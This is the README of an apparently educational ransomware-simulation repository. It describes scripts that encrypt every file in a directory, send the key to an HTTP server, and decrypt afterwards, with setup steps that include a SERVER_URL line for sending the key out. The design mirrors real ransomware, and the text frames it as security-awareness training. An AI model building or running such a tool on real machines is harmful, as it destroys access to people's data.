## ‚ö†Ô∏è Disclaimer

This attack is created **strictly for educational and awareness purposes only**. It simulates the behavior of a ransomware attack to demonstrate the **risks of downloading software from untrusted or pirated sources**. Do **NOT** misuse this attack for malicious purposes. The author is not responsible for any damages caused by misuse.

## üìù Overview

This repository simulates a basic ransomware attack:

* **encrypt.py** ‚Üí Encrypts files in the current directory and sends the encryption key to a server.
* **decrypt.py** ‚Üí Decrypts the encrypted files using the key retrieved from the server.
* **server.py** ‚Üí Simple HTTP server that receives and stores the encryption key.

The goal is to **educate employees or students** about the dangers of unsafe downloads and the importance of security awareness.

---

## ‚öôÔ∏è How It Works

1. The **server** must be started first to receive and store the encryption key.
2. The **encryptor** script encrypts all files in the working directory (except the scripts themselves) and sends the key to the server.
3. The **decryptor** script restores the files using the saved key.

## üöÄ Setup & Execution

### 1. Clone Repository

```bash
git clone https://github.com/your-username/ransomware-simulation.git
cd ransomware-simulation
```

### 2. Run the Server

On the target machine (Linux recommended), run:

```bash
python3 server.py
```

This will start listening on port **8080** by default.

### 3. Configure Encryptor

Edit **encrypt.py** and replace:

```python
SERVER_URL = "http://your ip:8080/upload"
```

with the IP address of the machine running `server.py`.

Example:

```python
SERVER_URL = "http://192.168.1.100:8080/upload"
```

### 4. Run Encryptor

On the victim simulation machine, run:

```bash
python3 encrypt.py
```

All files in the directory will now be encrypted.

### 5. Run Decryptor

Once the key has been retrieved by the server, place the file `received_key.key` into the encryptor‚Äôs directory and run:

```bash
python3 decrypt.py
```

This will restore all encrypted files.

## üìå Notes

* This is a **controlled simulation** only. Do not use on sensitive or personal data.
* Best used in a **virtual machine environment** for demonstrations.
* Teaches employees how **real ransomware** can lock files and why **safe downloading habits** are essential.
